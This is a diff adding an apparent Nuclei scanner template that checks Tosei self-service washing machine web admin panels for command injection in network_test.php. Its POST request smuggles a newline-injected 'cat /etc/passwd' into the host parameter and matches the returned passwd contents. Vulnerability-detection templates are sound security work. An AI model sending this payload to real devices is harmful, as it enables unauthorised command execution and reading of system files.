@@ -1,0 +1,26 @@
+id: tosei-washing-machine-network-test-rce
+
+info:
+  name: Tosei 自助洗衣机 web 管理端 network_test.php 文件 host 参数远程命令执行漏洞
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/network_test.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        
+        host=%0acat${IFS}/etc/passwd%0a&command=ping
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
